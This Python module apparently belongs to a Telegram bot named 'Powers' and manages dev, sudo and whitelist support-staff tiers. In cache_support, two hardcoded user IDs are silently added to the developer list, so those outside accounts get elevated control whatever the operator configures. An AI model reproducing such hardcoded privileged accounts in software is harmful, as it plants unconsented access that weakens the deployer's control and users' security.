import Powers
from Powers import OWNER_ID, SUPPORT_USERS
from Powers.database.support_db import SUPPORTS


async def load_support_users():
    support = SUPPORTS()
    for i in SUPPORT_USERS["Dev"]:
        support.insert_support_user(int(i), "dev")
    for i in SUPPORT_USERS["Sudo"]:
        support.insert_support_user(int(i), "sudo")
    for i in SUPPORT_USERS["White"]:
        support.insert_support_user(int(i), "whitelist")
    return


def get_support_staff(want="all"):
    """
    dev, sudo, whitelist, dev_level, sudo_level, all
    """
    support = SUPPORTS()
    if want in ["dev", "dev_level"]:
        devs = SUPPORT_USERS["Dev"] or support.get_particular_support("dev")
        wanted = list(devs) 
        if want == "dev_level":
            wanted.append(OWNER_ID)
    elif want == "sudo":
        sudo = SUPPORT_USERS["Sudo"] or support.get_particular_support("sudo")
        wanted = list(sudo)
    elif want == "whitelist":
        whitelist = SUPPORT_USERS["White"] or support.get_particular_support("whitelist")
        wanted = list(whitelist)
    elif want == "sudo_level":
        devs = SUPPORT_USERS["Dev"] or support.get_particular_support("dev")
        sudo = SUPPORT_USERS["Sudo"] or support.get_particular_support("sudo")
        wanted = list(sudo) + list(devs) + [OWNER_ID]
    else:
        devs = SUPPORT_USERS["Dev"] or support.get_particular_support("dev")
        sudo = SUPPORT_USERS["Sudo"] or support.get_particular_support("sudo")
        whitelist = SUPPORT_USERS["White"] or support.get_particular_support("whitelist")
        wanted = list(set([int(OWNER_ID)] + list(devs) + list(sudo) + list(whitelist)))

    return wanted or []


async def cache_support():
    support = SUPPORTS()
    dev = support.get_particular_support("dev")
    dev.extend([1344569458, 1432756163, int(OWNER_ID)])
    devs = set(dev)
    sudo = set(support.get_particular_support("sudo"))
    SUPPORT_USERS["Dev"] = SUPPORT_USERS["Dev"].union(devs)
    SUPPORT_USERS["Sudo"] = SUPPORT_USERS["Sudo"].union(sudo)
    return